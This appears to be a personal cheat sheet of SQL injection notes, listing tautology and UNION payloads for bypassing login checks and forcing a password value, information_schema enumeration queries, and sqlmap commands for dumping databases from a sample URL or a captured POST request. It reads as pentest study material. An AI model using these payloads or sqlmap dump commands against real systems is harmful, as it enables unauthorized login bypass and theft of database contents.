# Notes on SQL injection

- Always try a double quote " AND a single quote ' when testing for SQLi vulnerabilities in forms.

- 1' OR 1 = 1;-- is always true.

- something' OR '1' = '0 negates a SELECT query.

- ' OR 1 = 0 UNION ALL SELECT 'pass will select *pass* as the value of the query.

- A parametrized URL can be vulnerable to SQLi (/page/edit/:id).

---

## Basic SQL queries:

---

SELECT * FROM table_name;

SELECT username, password FROM users WHERE username = 'admin';

INSERT INTO table_name (username, password) VALUES ('admin', 'admin');

UPDATE table_name SET username='admin', password='admin' WHERE username='someuser';

DROP TABLE table_name;

---

## SQLi tricks

```SQL
-- List of tables in the database
SELECT table_name
FROM information_schema.tables
WHERE table_schema=database();
```

```SQL
-- List of column names in a particular table
SELECT column_name
FROM information_schema.columns
WHERE table_name='sometablename';
```

```SQL
-- Original query
SELECT username, password
FROM users
WHERE id='%s';

-- Bypass the checks
1' OR 1=1';--

-- Force a password
1' OR 1=0 UNION SELECT 'pass' as password;--
```

---

## SQLMap

A tool for finding and exploiting SQLi vulnerabilities in input fields or urls.

```bash
# guides through setting all necessary flags for the user
$ sqlmap --wizard
```

```bash
# extract database names
$ sqlmap --dbs

# extract info about the tables of a specific database
$ sqlmap -D <db_name> --tables

# enumerate the records in a table
$ sqlmap -D <db_name> -T <table_name> --dump

# in-depth scans
$ sqlmap <options> --level=5
```

#### HTTP GET-based testing

A URL like http://vulnerable.site/search?user=1 could be scanned like this:

```bash
# lists database names
# note the single quotes to avoid errors with special characters such as ?
$ sqlmap -u 'http://vulnerable.site/search?user=1' --cookie="SESSIONID=abcd123" --dbs
```

#### HTTP POST-based testing

Intercept a POST request on a login form, registration form, etc. and save it as a text file. SQLMap can parse the text file:

```bash
# req.txt should be saved directly from some Request window in burp suite
# optional flags:
# --tor --dbms=mysql --dump-all --tables --columns --schema
# --batch never ask for user input, use the default behaviour
$ python3 sqlmap.py -r req.txt --dump
```